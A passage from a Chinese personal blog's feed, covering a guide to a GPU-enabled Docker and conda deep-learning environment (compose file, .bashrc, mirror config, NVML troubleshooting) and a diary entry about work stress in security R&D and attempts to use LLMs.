class="hljs-string">../project:/data/project</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../cache:/root/.cache</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../anaconda3:/root/anaconda3</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">dl</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">dl</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br><br></code></pre></td></tr></table></figure><p>以上环境中映射了两个端口，一个是80，一个是22，22是方便ssh管理，80是方便把容器中的服务映射出来，各位可以根据自己的需求进行映射，由于conda是需要手动安装的，得自行下载安装包，默认安装目录是&#x2F;root&#x2F;anaconda3,这里映射出来了，以后可以直接用，并且conda的虚拟环境也可以进行拷贝使用，比较方便。</p><p>这里是把Dockerfile和docker-compose.yaml放在一个目录，方便构建，映射的目录在上一级目录，这么做的好处是减少在构建过程中扫描文件消耗的时间。</p><p>执行以下命令进行构建和运行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose build</span><br><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>自行验证以下，是否启动成功</p><h3 id="docker-compose高级配置"><a href="#docker-compose高级配置" class="headerlink" title="docker-compose高级配置"></a>docker-compose高级配置</h3><p>说明：<br>1、由于我已经安装过conda，这里直接在其他机器上拷贝conda目录，不用每次都安装，在容器中映射conda目录就行<br>2、各位可以把conda理解成jdk，配置以下环境变量就可以运行，但是conda把环境变量写到了用户目录下的.bashrc中，我这里懒得折腾，直接映射了.bashrc，仅供参考。<br>3、conda可以配置国内的镜像源，比如tsinghua tuna和ustc，有个问题就是镜像同步会有延迟，可能最新的包并不存在，各位在遇到这个问题需要注意，这里就不提供<code>.condarc</code>配置文件。<br>4、尽可能有个网络不错的梯子，个人建议</p><p>配置如下：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>  <span class="hljs-attribute">dl-env</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">./</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hksanduo/deeplearn-env:latest</span><br>    <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">deeplearn-env</span><br>    <span class="hljs-comment">#command: nvidia-smi</span><br>    <span class="hljs-attribute">deploy</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">resources</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">reservations</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">devices</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">driver: nvidia</span><br>              <span class="hljs-attribute">count</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2 </span><br>              <span class="hljs-attribute">capabilities</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[gpu]</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;40022:22&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;40080:80&quot;</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../models:/data/models</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../project:/data/project</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../cache:/root/.cache</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../anaconda3:/root/anaconda3</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">../.bashrc:/root/.bashrc</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">dl</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">dl</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br></code></pre></td></tr></table></figure><p>.bashrc如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span><br><span class="hljs-comment"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span><br><span class="hljs-comment"># for examples</span><br><br><span class="hljs-comment"># If not running interactively, don&#x27;t do anything</span><br>[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PS1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">return</span><br><br><span class="hljs-comment"># don&#x27;t put duplicate lines in the history. See bash(1) for more options</span><br><span class="hljs-comment"># ... or force ignoredups and ignorespace</span><br>HISTCONTROL=ignoredups:ignorespace<br><br><span class="hljs-comment"># append to the history file, don&#x27;t overwrite it</span><br><span class="hljs-built_in">shopt</span> -s histappend<br><br><span class="hljs-comment"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br>HISTSIZE=1000<br>HISTFILESIZE=2000<br><br><span class="hljs-comment"># check the window size after each command and, if necessary,</span><br><span class="hljs-comment"># update the values of LINES and COLUMNS.</span><br><span class="hljs-built_in">shopt</span> -s checkwinsize<br><br><span class="hljs-comment"># make less more friendly for non-text input files, see lesspipe(1)</span><br>[ -x /usr/bin/lesspipe ] &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(SHELL=/bin/sh lesspipe)</span>&quot;</span><br><br><span class="hljs-comment"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$debian_chroot</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="hljs-keyword">then</span><br>    debian_chroot=$(<span class="hljs-built_in">cat</span> /etc/debian_chroot)<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TERM</span>&quot;</span> <span class="hljs-keyword">in</span><br>    xterm-color) color_prompt=<span class="hljs-built_in">yes</span>;;<br><span class="hljs-keyword">esac</span><br><br><span class="hljs-comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span><br><span class="hljs-comment"># off by default to not distract the user: the focus in a terminal window</span><br><span class="hljs-comment"># should be on the output of commands, not on the prompt</span><br><span class="hljs-comment">#force_color_prompt=yes</span><br><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$force_color_prompt</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="hljs-keyword">then</span><br><span class="hljs-comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span><br><span class="hljs-comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span><br><span class="hljs-comment"># a case would tend to support setf rather than setaf.)</span><br>color_prompt=<span class="hljs-built_in">yes</span><br>    <span class="hljs-keyword">else</span><br>color_prompt=<br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$color_prompt</span>&quot;</span> = <span class="hljs-built_in">yes</span> ]; <span class="hljs-keyword">then</span><br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="hljs-keyword">else</span><br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">unset</span> color_prompt force_color_prompt<br><br><span class="hljs-comment"># If this is an xterm set the title to user@host:dir</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TERM</span>&quot;</span> <span class="hljs-keyword">in</span><br>xterm*|rxvt*)<br>    PS1=<span class="hljs-string">&quot;\[\e]0;<span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>\u@\h: \w\a\]<span class="hljs-variable">$PS1</span>&quot;</span><br>    ;;<br>*)<br>    ;;<br><span class="hljs-keyword">esac</span><br><br><span class="hljs-comment"># enable color support of ls and also add handy aliases</span><br><span class="hljs-keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dircolors -b)</span>&quot;</span><br>    <span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=<span class="hljs-string">&#x27;ls --color=auto&#x27;</span><br>    <span class="hljs-comment">#alias dir=&#x27;dir --color=auto&#x27;</span><br>    <span class="hljs-comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span><br><br>    <span class="hljs-built_in">alias</span> grep=<span class="hljs-string">&#x27;grep --color=auto&#x27;</span><br>    <span class="hljs-built_in">alias</span> fgrep=<span class="hljs-string">&#x27;fgrep --color=auto&#x27;</span><br>    <span class="hljs-built_in">alias</span> egrep=<span class="hljs-string">&#x27;egrep --color=auto&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># some more ls aliases</span><br><span class="hljs-built_in">alias</span> ll=<span class="hljs-string">&#x27;ls -alF&#x27;</span><br><span class="hljs-built_in">alias</span> la=<span class="hljs-string">&#x27;ls -A&#x27;</span><br><span class="hljs-built_in">alias</span> l=<span class="hljs-string">&#x27;ls -CF&#x27;</span><br><br><span class="hljs-comment"># Alias definitions.</span><br><span class="hljs-comment"># You may want to put all your additions into a separate file like</span><br><span class="hljs-comment"># ~/.bash_aliases, instead of adding them here directly.</span><br><span class="hljs-comment"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span><br><br><span class="hljs-keyword">if</span> [ -f ~/.bash_aliases ]; <span class="hljs-keyword">then</span><br>    . ~/.bash_aliases<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># enable programmable completion features (you don&#x27;t need to enable</span><br><span class="hljs-comment"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="hljs-comment"># sources /etc/bash.bashrc).</span><br><span class="hljs-comment">#if [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then</span><br><span class="hljs-comment">#    . /etc/bash_completion</span><br><span class="hljs-comment">#fi</span><br><br><span class="hljs-built_in">export</span> PATH=/root/anaconda3/bin:<span class="hljs-variable">$PATH</span><br><br><span class="hljs-comment"># &gt;&gt;&gt; conda initialize &gt;&gt;&gt;</span><br><span class="hljs-comment"># !! Contents within this block are managed by &#x27;conda init&#x27; !!</span><br>__conda_setup=<span class="hljs-string">&quot;<span class="hljs-subst">$(&#x27;/root/anaconda3/bin/conda&#x27; &#x27;shell.bash&#x27; &#x27;hook&#x27; 2&gt; /dev/null)</span>&quot;</span><br><span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-variable">$__conda_setup</span>&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;/root/anaconda3/etc/profile.d/conda.sh&quot;</span> ]; <span class="hljs-keyword">then</span><br>        . <span class="hljs-string">&quot;/root/anaconda3/etc/profile.d/conda.sh&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;/root/anaconda3/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">unset</span> __conda_setup<br><span class="hljs-comment"># &lt;&lt;&lt; conda initialize &lt;&lt;&lt;</span><br><br><br><br><span class="hljs-comment"># JINA_CLI_BEGIN</span><br><br><span class="hljs-comment">## autocomplete</span><br><span class="hljs-function"><span class="hljs-title">_jina</span></span>() &#123;<br>  COMPREPLY=()<br>  <span class="hljs-built_in">local</span> word=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMP_WORDS[COMP_CWORD]&#125;</span>&quot;</span><br><br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$COMP_CWORD</span>&quot;</span> -eq 1 ]; <span class="hljs-keyword">then</span><br>    COMPREPLY=( $(compgen -W <span class="hljs-string">&quot;<span class="hljs-subst">$(jina commands)</span>&quot;</span> -- <span class="hljs-string">&quot;<span class="hljs-variable">$word</span>&quot;</span>) )<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">local</span> words=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMP_WORDS[@]&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">unset</span> words[0]<br>    <span class="hljs-built_in">unset</span> words[<span class="hljs-variable">$COMP_CWORD</span>]<br>    <span class="hljs-built_in">local</span> completions=$(jina completions <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;words[@]&#125;</span>&quot;</span>)<br>    COMPREPLY=( $(compgen -W <span class="hljs-string">&quot;<span class="hljs-variable">$completions</span>&quot;</span> -- <span class="hljs-string">&quot;<span class="hljs-variable">$word</span>&quot;</span>) )<br>  <span class="hljs-keyword">fi</span><br>&#125;<br><br>complete -F _jina jina<br><br><span class="hljs-comment"># session-wise fix</span><br><span class="hljs-built_in">ulimit</span> -n 4096<br><span class="hljs-built_in">export</span> OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES<br><span class="hljs-comment"># default workspace for Executors</span><br><br><span class="hljs-comment"># JINA_CLI_END</span><br></code></pre></td></tr></table></figure><p>我直接使用了代理，.condarc可以参考以下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs less">channels:<br> - defaults<br>show_channel_urls: true<br>default_channels:<br> - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main<br> - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/<span class="hljs-attribute">r</span><br><span class="hljs-attribute"> - https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span><br> - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br><span class="hljs-attribute">custom_channels</span>:<br> <span class="hljs-attribute">conda-forge</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">msys2</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">bioconda</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">menpo</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">pytorch</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">pytorch-lts</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br> <span class="hljs-attribute">simpleitk</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="hljs-attribute">auto_activate_base</span>: false<br></code></pre></td></tr></table></figure><p>构建命令同上即可</p><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><h3 id="Failed-to-initialize-NVML-Unknown-Error"><a href="#Failed-to-initialize-NVML-Unknown-Error" class="headerlink" title="Failed to initialize NVML: Unknown Error"></a>Failed to initialize NVML: Unknown Error</h3><p>现象就是在容器中使用nvidia-smi也找不到显卡。</p><blockquote><p>Note: libnvidia-containerAUR has no support for cgroups v2. You need to set the systemd.unified_cgroup_hierarchy&#x3D;false kernel parameter and set no-cgroups &#x3D; false in &#x2F;etc&#x2F;nvidia-container-runtime&#x2F;config.toml if you are using systemd v248 or higher.</p></blockquote><p>执行 systemctl –version 查看 systemd 版本，如果是 v248 或更高则可确认是该问题：<br><img src="/img/20231013-02.png" alt=" systemd version "></p><p>需要做的有：</p><ul><li>添加内核参数 <code>systemd.unified_cgroup_hierarchy=false</code></li><li>在 <code>/etc/nvidia-container-runtime/config.toml</code> 修改参数 <code>no-cgroups = false</code></li></ul><p>其中内核参数修改方法（GRUB）为：编辑 <code>/etc/default/grub</code>，在 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 参数双引号内加上所需参数：<code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;... systemd.unified_cgroup_hierarchy=false&quot;</code>，再执行 <code>grub-mkconfig -o /boot/grub/grub.cfg</code> 生成启动引导配置文件。然后重启电脑，执行 <code>cat /proc/cmdline</code> 确认参数已添加。<br><img src="/img/20231013-03.png" alt=" grub "></p><p>执行以下命令，更新grub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><p>取消该注释：</p><p><img src="/img/20231013-04.png" alt="config.toml"></p><p>注意：这个错误有个玄学的问题，重启容器也能解决</p><h3 id="Cannot-start-service-dl-env-could-not-select-device-driver-“nvidia”-with-capabilities-gpu"><a href="#Cannot-start-service-dl-env-could-not-select-device-driver-“nvidia”-with-capabilities-gpu" class="headerlink" title="Cannot start service dl-env: could not select device driver “nvidia” with capabilities: [[gpu]]"></a>Cannot start service dl-env: could not select device driver “nvidia” with capabilities: [[gpu]]</h3><p>这个错误是由于未安装nvidia-container-toolkit或者安装完成后未重启docker导致的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人的一些小技巧，总结以下：<br>1、稳定的梯子<br>2、conda可能会安装CPU版本，在安装过程中一定确定安装列表，出现CPU版本，直接退出安装，安装完也没法用，浪费时间。<br>3、个人比较习惯使用conda建立虚拟环境，使用pip安装依赖<br>4、conda目录是可以相互拷贝的，最主要的是里面的envs的环境也是可以拷贝使用的<br>5、局域网基本上都是千兆或者万兆的，百兆就别玩了，太浪费时间，使用rsync同步模型和数据，比较方便<br>6、使用tmux，方便后台执行，注意需要区分和conda 加载虚拟环境的顺序，先使用tmux 创建并进入session，然后使用<code>conda activate &#123;env&#125;</code> 激活环境<br>7、linux代理，建议直接使用配置环境的方式配置代理 <code>export https_proxy=&#123;proxy server&#125;</code> ，这里主要是方便git-lfs下载hugging face模型，使用proxychains对git-lfs无效。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html#installation-guide">https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html#installation-guide</a>【container-toolkit 安装指导 】</li><li><a href="https://www.anaconda.com/download">https://www.anaconda.com/download</a>【anacoda下载地址】</li><li><a href="https://wiki.archlinux.org/title/Docker#Run_GPU_accelerated_Docker_containers_with_NVIDIA_GPUs">https://wiki.archlinux.org/title/Docker#Run_GPU_accelerated_Docker_containers_with_NVIDIA_GPUs</a>【Run GPU accelerated Docker containers with NVIDIA GPUs】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无题</title>
    <link href="/2023/10/11/2023-10-11-bad-ideas/"/>
    <url>/2023/10/11/2023-10-11-bad-ideas/</url>
    
    <content type="html"><![CDATA[<p>无题</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>纵使有前言万语，打开编辑器，但是不知道怎么开头，也不知道如何下笔，敲了删，删了敲，纠结，彷徨，还是随便写写，反正也没人看，当作一段时间的碎碎念吧。</p><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>其实想聊的还是工作，工作吧，保障生存的基本需求，其实特别烦，以前按点上下课，现在是按时上下班，总感觉碌碌无为。上学的时候，为了好的成绩、好的工作努力，工作后，为了生存努力工作，有个长辈说我活得不潇洒，这句话让我好长时间都缓不过来。是啊，没有周公子之类的家境，每天为了生存而工作，哪来的机会潇洒，每天工作用尽了自己全部的精力，还能去那里潇洒，回家躺在床上就不想动了。个人感觉，对于普通人，工作就是生活的一部分，没人喜欢工作，但是又不得不工作，这个无可厚非。无法决定是否工作，但是可以尽可能尝试去选择一下工作内容，提升一下工作的舒适度。<br>以上废话说的真实冠冕堂皇，自己都服了自己了。搞安全研发工作，个人能力一般，公司规模小，薪资包小，无法招聘到大佬或者合适的人员，研发进度缓慢，各种破事还在消磨你的时间，研发的产品不可替代性还特喵的挺弱的，吐血。有些太极选手(喜欢甩锅的同事)，把工作氛围搞得一团糟，懒得吐槽了，敬而远之。如同大部分创业公司，追求新技术，新概念，产品不一定能给用户解决足够的痛点，有时候也挺尴尬的。最近开始再尝试LLM相关内容，也是醉了，前前后后尝试了一堆，了解的越深入越emo，非炼丹专业，单纯用开源模型来处理安全问题，现在的轮子都无法满足需求，测试过程中，轮子出现了许多非预期的结果，没法直接使用，自己训练小模型做数据分类还可以，使用开源llm做一些安全场景分析或者漏洞分析就不行了，主要问题来源于两方面，一方面是目前无足够的数据供模型进行训练和学习，无成熟的轮子，另一方面是目前商业模型才能达到我们的预期，所有开源模型均无法满足需求。和AWS的某位前辈沟通得知，目前开源模型和商业模型差的不是一星半点儿，信心备受打击，焦虑加倍。</p><p>目前的现状总结以下：</p><p>1、个人能力的不足与当前新技术新需求之间的矛盾<br>2、产品迭代优化需求旺盛与人员数量能力之间的矛盾<br>3、安全产品研发周期久与创业盈利之间的矛盾</p><p>好多事情不是自己能左右的，并不是你努力就可以办到的，比如招聘，看到一个不错的，人家想谋求一份大厂高新的工作或者稳定单位的岗位，折中寻找大差不差的人员，人家又漫天要价，浪费时间。工作上的焦虑也影响到生活上，身体也出了些问题，最近在思考，是不是换个工作，换个环境，工资少一些，压力少点儿，突然发现还又一屁股债，日了狗了…… 目前相当焦虑，也没有和周边的朋友述说，大家都挺难的，也没人来关注你到底如何，没人可怜你，只要人死不了就行，能赚钱就行。</p><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>上周GPT给了一个如何判断自己抑郁的回答，仅供参考：</p><blockquote><p>以下是一些可能表明你正处于抑郁状态的迹象：</p><ol><li>感到沮丧或悲伤，没有兴趣做以前感到快乐的事情。</li><li>失眠或睡眠过多、躁动或缓慢。</li><li>感到疲劳或缺乏能量。</li><li>无法集中精力或记忆力下降。</li><li>感到无用、无希望或内疚。</li><li>减少食欲或暴饮暴食。</li><li>感到焦虑、烦躁或易怒。</li><li>感到身体疼痛或头痛。<br>以上这些迹象可能是抑郁的典型症状，但并不一定表明您一定有抑郁症。如果您在一段时间内经历了这些症状，并且这些症状已经影响了日常生活和工作，那么最好咨询专业医生进行评估和治疗。</li></ol></blockquote><p>自己倒是挺符合的，但是目前应该只是单纯焦虑，还不至于抑郁，也了解了不少抑郁症相关信息，以下两张图，送给需要的朋友。</p><p><img src="/img/20231011-01.png" alt="如何帮助有抑郁症的朋友"></p><p><img src="/img/20231011-02.png" alt="如何帮助有抑郁症的朋友"></p><p>之前说的锻炼身体，好好学习，没几项落实的，也就骑车坚持下来了，体重还是没有降下去，难过。9月底骑行60公里，算是一个小突破，之前从来没有骑行那么远，身体挺累的，但是心理成就感还是挺满足的。放下电子设备的感觉还是不错的，远离无聊社交和垃圾信息。</p><p>之前看知乎，有个题目叫“为什么穷人家的孩子成功不了”，截取其中一段有意思的回答：</p><blockquote><p>老实孩子，无家底，却有家教。法家锁喉，儒家捏肋。倘若持善，则唯有活成道家，自诩平凡，顺其自然；倘若不善，则或是道成枭雄，或是法外匹夫。</p></blockquote><p>对于这个，我就不做过多的分析，原各位穷人家的孩子都能活成道家，逍遥于世。</p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
